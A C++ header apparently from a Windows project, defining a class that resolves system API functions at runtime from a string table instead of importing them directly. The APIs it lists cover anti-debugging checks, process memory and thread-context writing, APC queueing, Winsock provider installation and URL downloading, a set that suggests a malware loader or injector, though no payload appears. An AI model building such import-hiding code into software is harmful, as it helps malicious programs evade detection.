#pragma once

#include "StdString.h"
#include "StringTable.h"


#define _KERNEL_API_FIRST				0x00000000
#define _KERNEL_API_GetModuleHandleA    0x00000000
#define _KERNEL_API_LoadLibraryA		0x00000001
#define _KERNEL_API_FreeLibrary			0x00000002
#define _KERNEL_API_GetProcAddress		0x00000003
#define _KERNEL_API_CopyFileA			0x00000004
#define _KERNEL_API_QueueUserAPC		0x00000005
#define _KERNEL_API_GetModuleFileNameA	0x00000006
#define _KERNEL_API_ExpandEnvironmentStringsA	0x00000007
#define _KERNEL_API_CheckRemoteDebuggerPresent	0x00000008
#define _KERNEL_API_IsDebuggerPresent			0x00000009
#define _KERNEL_API_GetVolumeInformationA		0x0000000A
#define _KERNEL_API_CreateMutexA				0x0000000B
#define _KERNEL_API_GetLastError				0x0000000C

#define _KERNEL_API_WaitForDebugEvent			0x0000000D
#define _KERNEL_API_DebugActiveProcess			0x0000000E
#define _KERNEL_API_ContinueDebugEvent			0x0000000F
#define _KERNEL_API_DebugSetProcessKillOnExit	0x00000010
#define _KERNEL_API_GetThreadContext			0x00000011
#define _KERNEL_API_SetThreadContext			0x00000012
#define _KERNEL_API_SuspendThread				0x00000013
#define _KERNEL_API_ResumeThread				0x00000014
#define _KERNEL_API_ReadProcessMemory			0x00000015
#define _KERNEL_API_WriteProcessMemory			0x00000016
#define _KERNEL_API_FlushInstructionCache		0x00000017
#define _KERNEL_API_DebugActiveProcessStop		0x00000018
#define _KERNEL_API_CreateProcessA				0x00000019
#define _KERNEL_API_CloseHandle					0x0000001A
#define _KERNEL_API_SleepEx						0x0000001B
#define _KERNEL_API_Sleep						0x0000001C



#define _WINSOCK_API_WSAStartup				0x00010000
#define _WINSOCK_API_WSACleanup				0x00010001
#define _WINSOCK_API_WSCEnumProtocols		0x00010002
#define _WINSOCK_API_WSCInstallProvider		0x00010003
#define _WINSOCK_API_WSCWriteProviderOrder	0x00010004
#define _WINSOCK_API_WSCDeinstallProvider	0x00010005
#define _WINSOCK_API_WPUCompleteOverlappedRequest 0x00010006
#define _WINSOCK_API_WSCGetProviderPath		0x00010007
#define _WINSOCK_API_WSASetLastError		0x00010008
#define _WINSOCK_API_WSAGetLastError		0x00010009

#define _SHLW_API_PathFileExistsA	0x00020000
#define _SHLW_API_PathFindFileNameA	0x00020001
#define _SHLW_API_PathAddBackslashA	0x00020002

#define _OLE32_API_StringFromGUID2 0x00030000

#define _INETAPI_InternetOpenUrlA	 0x00040000
#define _INETAPI_InternetReadFile	 0x00040001
#define _INETAPI_InternetOpenA		 0x00040002
#define _INETAPI_InternetCloseHandle 0x00040003
#define _INETAPI_InternetGetLastResponseInfoA 0x00040004
#define _INETAPI_InternetCanonicalizeUrlA 0x00040005

#define _RPC_API_UuidCreateSequential 0x00050000

#define _USER_API_DispatchMessageA		0x00060000
#define _USER_API_DispatchMessageW		0x00060001
#define _USER_API_CreateDialogParamA	0x00060002
#define _USER_API_GetMessageA			0x00060003
#define _USER_API_IsDialogMessageA		0x00060004
#define _USER_API_TranslateMessage		0x00060005


/**  
 * \brief 
 */
class CApiTable
{
private:
	struct ApiEntry
	{
		int fnName;
		FARPROC fnAddr;
	};

	struct ApiSection
	{
		int dllName;
		HMODULE hModule;
		ApiEntry pApiList[255];
	};


public:
	/**  
	 * \brief 
	 */
	static void Term()
	{

	}


	/**  
	 * \brief 
	 */
	static FARPROC GetProc(int id)
	{
		if (CApiTable::GetProcAddress(_KERNEL_API_GetProcAddress) == 0)
		{
			CApiTable::SetProcAddress(_KERNEL_API_GetModuleHandleA, (FARPROC)GetModuleHandleA);
			CApiTable::SetProcAddress(_KERNEL_API_LoadLibraryA, (FARPROC)LoadLibraryA);
			CApiTable::SetProcAddress(_KERNEL_API_FreeLibrary, (FARPROC)FreeLibrary);
			CApiTable::SetProcAddress(_KERNEL_API_GetProcAddress, (FARPROC)::GetProcAddress);
		}


		FARPROC ret = CApiTable::GetProcAddress(id);

		if (!ret)
		{
			HMODULE (__stdcall* GetModuleHandlePtr)(const char*) = (HMODULE(__stdcall*)(const char*))CApiTable::GetProcAddress(_KERNEL_API_GetModuleHandleA);
			HMODULE (__stdcall* LoadLibraryPtr)(const char*) = (HMODULE(__stdcall*)(const char*))CApiTable::GetProcAddress(_KERNEL_API_LoadLibraryA);
			FARPROC (__stdcall* GetProcAddressPtr)(HMODULE,const char*) = (FARPROC(__stdcall*)(HMODULE,const char*))CApiTable::GetProcAddress(_KERNEL_API_GetProcAddress);

			ApiSection* pTable = CApiTable::GetApiTablePtr();

			int idSection = CApiTable::GetSection(id);
			int idApi = CApiTable::GetIndex(id);

			int idDllName = pTable[idSection].dllName;
			CStdString strDllName;
			strDllName = CStringTable::GetString(idDllName);

			HMODULE hDll = GetModuleHandlePtr(strDllName.c_str());

			if (!hDll)
			{
				hDll = LoadLibraryPtr(strDllName.c_str());
				pTable[idSection].hModule = hDll;
			}


			int idFnName = pTable[idSection].pApiList[idApi].fnName;

			if (IsOrdinal(id))
			{
				ret = GetProcAddressPtr(hDll, (const char*)(LOWORD(idFnName)));
			}
			else
			{
				CStdString strFnName = CStringTable::GetString(idFnName);

				ret = GetProcAddressPtr(hDll, strFnName.c_str());
			}

			pTable[idSection].pApiList[idApi].fnAddr = ret;
		}

		return ret;
	}


private:
	/**  
	 * \brief 
	 */
	static int GetSection(int id)
	{
		return (id & 0x7FFF0000) >> 16; 
	}


	/**  
	 * \brief 
	 */
	static int GetIndex(int id)
	{
		return (id & 0x0000FFFF); 
	}


	/**  
	 * \brief 
	 */
	static bool IsOrdinal(int id)
	{
		return (id & 0x80000000) != 0; 
	}


	/**  
	 * \brief 
	 */
	static FARPROC GetProcAddress(int id)
	{
		return CApiTable::GetApiTablePtr()[CApiTable::GetSection(id)].pApiList[CApiTable::GetIndex(id)].fnAddr;
	}


	/**  
	 * \brief 
	 */
	static void SetProcAddress(int id, FARPROC addr)
	{
		CApiTable::GetApiTablePtr()[CApiTable::GetSection(id)].pApiList[CApiTable::GetIndex(id)].fnAddr = addr;
	}


	/**  
	 * \brief 
	 */
	static HMODULE GetModuleHandle(int id)
	{
		return CApiTable::GetApiTablePtr()[CApiTable::GetSection(id)].hModule;
	}


	/**  
	 * \brief 
	 */
	static void SetModuleHandle(int id, HMODULE hModule)
	{
		CApiTable::GetApiTablePtr()[CApiTable::GetSection(id)].hModule = hModule;
	}


	/**  
	 * \brief 
	 */
	static ApiSection* GetApiTablePtr()
	{
		static ApiSection table[] = 
		{
			{
				_STRING_Kernel32_dll, 0,
				{
					{_STRING_GetModuleHandleA, 0},	// 0x00000000
					{_STRING_LoadLibraryA, 0},		// 0x00000001
					{_STRING_FreeLibrary, 0},		// 0x00000002
					{_STRING_GetProcAddress, 0},	// 0x00000003
					{_STRING_CopyFileA, 0},			// 0x00000004
					{_STRING_QueueUserAPC, 0},		// 0x00000005
					{_STRING_GetModuleFileNameA, 0},// 0x00000006
					{_STRING_ExpandEnvironmentStringsA, 0},	// 0x00000007
					{_STRING_CheckRemoteDebuggerPresent, 0},// 0x00000008
					{_STRING_IsDebuggerPresent, 0},			// 0x00000009
					{_STRING_GetVolumeInformationA, 0},		// 0x0000000A
					{_STRING_CreateMutexA, 0},				// 0x0000000B
					{_STRING_GetLastError, 0},				// 0x0000000C

					{_STRING_WaitForDebugEvent, 0},				// 0x0000000D
					{_STRING_DebugActiveProcess, 0},			// 0x0000000E
					{_STRING_ContinueDebugEvent, 0},			// 0x0000000F
					{_STRING_DebugSetProcessKillOnExit, 0},		// 0x00000010
					{_STRING_GetThreadContext, 0},				// 0x00000011
					{_STRING_SetThreadContext, 0},				// 0x00000012
					{_STRING_SuspendThread, 0},					// 0x00000013
					{_STRING_ResumeThread, 0},					// 0x00000014
					{_STRING_ReadProcessMemory, 0},				// 0x00000015
					{_STRING_WriteProcessMemory, 0},			// 0x00000016
					{_STRING_FlushInstructionCache, 0},			// 0x00000017
					{_STRING_DebugActiveProcessStop, 0},		// 0x00000018
					{_STRING_CreateProcessA, 0},				// 0x00000019		
					{_STRING_CloseHandle, 0},					// 0x0000001A
					{_STRING_SleepEx, 0},						// 0x0000001B
					{_STRING_Sleep, 0},							// 0x0000001C
					
				},
			},

			{
				_STRING_Winsock32_dll, 0,
				{
					{_STRING_WSAStartup, 0},			// 0x00010000
					{_STRING_WSACleanup, 0},			// 0x00010001
					{_STRING_WSCEnumProtocols, 0},		// 0x00010002
					{_STRING_WSCInstallProvider, 0},	// 0x00010003
					{_STRING_WSCWriteProviderOrder, 0},	// 0x00010004
					{_STRING_WSCDeinstallProvider, 0},	// 0x00010005
					{_STRING_WPUCompleteOverlappedRequest, 0},	// 0x00010006
					{_STRING_WSCGetProviderPath, 0},	// 0x00010007
					{_STRING_WSASetLastError, 0},		// 0x00010008
					{_STRING_WSAGetLastError, 0},		// 0x00010009
				}
			},

			{
				_STRING_Shlwapi_dll, 0,
				{
					{_STRING_PathFileExistsA, 0},
					{_STRING_PathFindFileNameA, 0},
					{_STRING_PathAddBackslashA, 0},
				}
			},

			{
				_STRING_Ole32_dll, 0,
				{
					{_STRING_StringFromGUID2, 0},
				}
			},

			{
				_STRING_Wininet_dll, 0,
				{
					{_STRING_InternetOpenUrlA, 0},		// 0x00040000
					{_STRING_InternetReadFile, 0},		// 0x00040001
					{_STRING_InternetOpenA, 0},			// 0x00040002
					{_STRING_InternetCloseHandle, 0},	// 0x00040003
					{_STRING_InternetGetLastResponseInfoA, 0},  // 0x00040004
					{_STRING_InternetCanonicalizeUrlA, 0}, // 0x00040005
				}
			},

			{
				_STRING_Rpcrt4_dll, 0,
				{
					{_STRING_UuidCreateSequential, 0},  // 0x00050000
				}
			},

			{
				_STRING_User32_dll, 0,
				{
					{_STRING_DispatchMessageA, 0},		// 0x00060000
					{_STRING_DispatchMessageW, 0},		// 0x00060001
					{_STRING_CreateDialogParamA, 0},	// 0x00060002
					{_STRING_GetMessageA, 0},			// 0x00060003
					{_STRING_IsDialogMessageA, 0},		// 0x00060004
					{_STRING_TranslateMessage, 0},		// 0x00060005
				}
			},

			{0}
		};

		return table;
	}
};